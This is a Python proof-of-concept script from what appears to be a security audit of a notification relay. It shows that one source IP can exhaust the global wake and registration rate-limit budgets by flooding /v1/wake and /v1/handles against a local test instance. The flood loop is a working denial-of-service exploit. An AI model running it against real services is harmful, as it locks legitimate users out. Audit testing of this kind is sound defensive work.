#!/usr/bin/env python3
"""Finding: one source drains the GLOBAL wake and registration budgets.

`wake_inner` charges wake_global before the per-IP check and before the
handle is opened; `register_inner` charges issue_global before issue_ip.
So a single source address (one IP, no valid handle, nothing sent to FCM)
spends the 6000/h wake and 600/h registration budgets of every other user.

Run against a fresh relay (default config, no trusted_proxy):
  ./up.sh $W; python3 a_global_drain.py; ./down.sh $W
"""
import json, sys, time
import rr

# legitimate victims, each registered from its own address before the attack
handles = [rr.make_handle("victim%d:token" % i, src="127.0.0.%d" % (20 + i)) for i in range(12)]
victim_handle = handles[0]
print("victim wake before attack:", rr.post("/v1/wake", {"v": 1, "handle": victim_handle}, src="127.0.0.3")[0])

# --- wake budget: garbage handles from ONE source
n = 0
statuses = {}
t = time.time()
while True:
    st, _ = rr.post("/v1/wake", {"v": 1, "handle": "A" * 40}, src="127.0.0.2")
    n += 1
    statuses[st] = statuses.get(st, 0) + 1
    # one probe per 250 attacker requests, own handle and own source (no per-handle/IP limit can fire)
    v = rr.post("/v1/wake", {"v": 1, "handle": handles[1 + (n // 250) % 11]}, src="127.0.0.%d" % (40 + n // 250))[0] if n % 250 == 0 else None
    if v == 429 or n > 8000:
        break
print("attacker requests until victim (other IP, valid handle) is rate-limited:", n,
      "attacker statuses:", statuses, "in %.1fs" % (time.time() - t))
print("victim wake from another IP now:", rr.post("/v1/wake", {"v": 1, "handle": victim_handle}, src="127.0.0.4"))
print("FCM sends caused by the attacker's garbage: 0 expected; fake FCM saw sends =", rr.fcm()["sends"])

# --- registration budget: public app id + syntactically valid address, one source
m = 0
sts = {}
while m < 800:
    st, _ = rr.post("/v1/handles", rr.reg_body("x%d:y" % m), src="127.0.0.2")
    m += 1
    sts[st] = sts.get(st, 0) + 1
print("registration statuses from the attacker:", sts)
print("victim registration from a fresh IP:", rr.post("/v1/handles", rr.reg_body("victim2:token"), src="127.0.0.9"))
